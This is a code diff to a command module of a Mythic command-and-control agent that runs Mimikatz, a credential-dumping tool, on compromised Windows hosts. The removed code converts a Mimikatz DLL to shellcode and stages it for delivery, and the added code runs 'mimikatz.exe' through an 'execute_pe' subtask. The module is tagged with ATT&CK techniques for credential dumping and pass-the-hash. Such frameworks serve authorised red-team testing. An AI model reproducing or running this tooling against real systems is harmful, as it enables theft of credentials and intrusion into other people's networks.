@@ -21,7 +21,8 @@ class MimikatzArguments(TaskArguments):
                 self.load_args_from_json_string(self.command_line)
             else:
                 self.add_arg("command", self.command_line)
-            self.add_arg("pipe_name", str(uuid4()))
+            curArg = self.get_arg("command")
+            self.add_arg("command", "mimikatz.exe {}".format(curArg))
         else:
             raise Exception("No mimikatz command given to execute.\n\tUsage: {}".format(MimikatzCommand.help_cmd))
 
@@ -42,20 +43,11 @@ class MimikatzCommand(CommandBase):
     argument_class = MimikatzArguments
     browser_script = BrowserScript(script_name="unmanaged_injection", author="@djhohnstein")
     attackmapping = ["T1134", "T1098", "T1547", "T1555", "T1003", "T1207", "T1558", "T1552", "T1550"]
+    script_only = True
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
-        dllFile = path.join(self.agent_code_path, f"mimikatz_{task.callback.architecture}.dll")
-        dllBytes = open(dllFile, 'rb').read()
-        converted_dll = ShellcodeRDI.ConvertToShellcode(dllBytes, ShellcodeRDI.HashFunctionName("smb_server_wmain"), task.args.get_arg("pipe_name").encode(), 0)
-        file_resp = await MythicRPC().execute("create_file",
-                                              task_id=task.id,
-                                              file=base64.b64encode(converted_dll).decode(),
-                                              delete_after_fetch=True)
-        if file_resp.status == MythicStatus.Success:
-            task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
-        else:
-            raise Exception("Failed to register Mimikatz DLL: " + file_resp.error)
-        task.display_params = task.args.get_arg("command")
+        response = await MythicRPC().execute("create_subtask", parent_task_id=task.id,
+                        command="execute_pe", params_string=task.args.get_arg("command"))
         return task
 
     async def process_response(self, response: AgentResponse):
